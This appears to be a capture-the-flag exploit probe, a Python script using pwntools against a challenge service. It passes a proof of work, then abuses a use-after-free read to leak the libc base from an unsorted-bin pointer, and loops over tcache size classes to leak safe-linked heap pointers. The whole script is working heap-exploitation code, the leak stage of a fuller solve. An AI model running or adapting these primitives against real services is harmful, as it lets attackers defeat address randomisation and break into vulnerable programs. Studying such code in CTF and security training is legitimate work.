#!/usr/bin/env python3
"""Probe: libc base + heap leak exactly as solve.py does it."""
import sys
from client import LM10Client
from pwn import u64, log  # type: ignore


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 1337
    c = LM10Client(host, port)
    c.pass_pow()
    log.success("PoW cleared")

    # Libc leak
    big = c.record(b"A" * 0x440)
    _g  = c.record(b"G" * 0x60)
    c.retire(big)
    unsorted_fd = u64(c.recall(big)[:8])
    libc_base = unsorted_fd - 0x60 - 0x219c80
    log.info(f"libc base: {libc_base:#x}")
    _ = c.record(b"R" * 0x440)            # pull back

    # Heap leak: probe several size classes to find a CLEAN pos>>12
    for size in (0x178, 0x158, 0x138, 0x1b8, 0x1f8, 0x238, 0x2f8, 0x3b8):
        i0 = c.record(b"P" * size)
        i1 = c.record(b"Q" * size)
        c.retire(i0)
        c.retire(i1)
        f0 = u64(c.recall(i0)[:8])
        f1 = u64(c.recall(i1)[:8])
        log.info(f"size {size:#x}: fd0={f0:#x} fd1={f1:#x}")

    c.close()


if __name__ == "__main__":
    main()
